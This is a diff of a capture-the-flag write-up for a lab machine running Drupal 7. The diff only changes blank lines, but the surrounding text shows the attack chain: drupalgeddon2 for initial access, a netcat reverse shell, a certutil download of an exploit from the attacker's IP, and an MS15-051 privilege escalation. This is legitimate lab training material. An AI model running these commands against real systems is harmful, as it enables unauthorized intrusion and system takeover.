@@ -41,7 +41,6 @@ Running a search against searchsploit for "drupal 7" shows multiple results, 3 o
 
 ![image](assets/79607582-6d5bd600-80c1-11ea-8a0e-9b9a04c7699f.png)
 
-
 [drupalgeddon2](https://www.exploit-db.com/exploits/44449) is an exploit written in ruby which provides a root shell (if vulnerable). I made one modification to the script, "tryphpshell = false", because it appeared there was insufficient access to the web root.
 
 ```
@@ -75,7 +74,6 @@ nc.exe -e cmd 10.10.14.16 4200
 
 ![image](assets/79614047-ba45a980-80cd-11ea-9f36-b4085af58e80.png)
 
-
 ## Steps (root/system)
 
 Running systeminfo showed N/A for hotfixes so at this point I decided to run Sherlock and check for exploits.
@@ -107,6 +105,7 @@ certutil -urlcache -split -f http://10.10.14.16/ms15-051x64.exe
 ```
 
 I set up a netcat listener (rlwrap nc -lvnp 4201) and ran the exploit providing my IP and port as parameters
+
 ```
 ms15-051x64 -e cmd.exe 10.10.14.16 4201
 ```
